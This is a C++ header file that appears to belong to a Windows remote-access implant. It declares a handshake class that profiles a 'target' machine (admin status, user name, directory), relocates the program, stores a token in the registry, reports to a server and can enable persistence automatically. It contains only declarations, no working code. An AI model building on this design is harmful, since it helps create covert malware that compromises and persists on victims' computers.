#ifndef HANDSHAKE_H
#define HANDSHAKE_H
#include <iostream>
#include <windows.h>

using namespace  std;


class HandShake
{

/*
Collect the first information unavailable to the program and manages the client's first actions  .
Sends the primary information when the client connects.

1- performs the first action of the program.
2- Send the first information to the server.
*/
    public:

        HandShake();

        ////Collects information from the machine:   
        bool setIsAdmin(); //look if admin or not and return false or true.
        string setNameUser(); // Return name user of target 
        string setCurrentDirectory(); // return current directory;
        string setLocationProg(); //set localisation prog after remove according to rights
        void setSock(int sock); //Set socket
        
        string getTokenOrSetTokenInRegistry();
        wstring generateToken(const int token_size); //Generate tokken and set in a_token.

        //---------------------------------------------------------------------
        //Network:
    

        //---------------------------------------------------------------------
        void beforeHandShake(); //manage actions before startHandShake and set a_location_prog
        void startHandShake(); //Sends the first necessary information to the server and if MOD_HANDSHAKE_AUTO_PERSISTENCE = True then persistence is activated automatically. 

        //---------------------------------------------------------------------
        
        bool getIsAdmin();//getter of is_admin
        string getPathProg();// getter see location of prog.
        string getNameUser();
        string getToken();
        //---------------------------------------------------------------------
        void moveProg(); 

    private:
        bool a_is_admin=false;// check if target is admin or not.
        string a_name_prog;
        //string a_time; //Time to run program
        // string a_date;
        // string a_key; // key for cipher.
        string a_name_user; //https://stackoverflow.com/questions/11587426/get-current-username-in-c-on-windows
        string a_current_directory; //Location of programme execute.
        string a_location_prog; //Location of the program once moved or not moved
        string a_token;

        timeval a_timeout;
    
        int a_sock;
};

#endif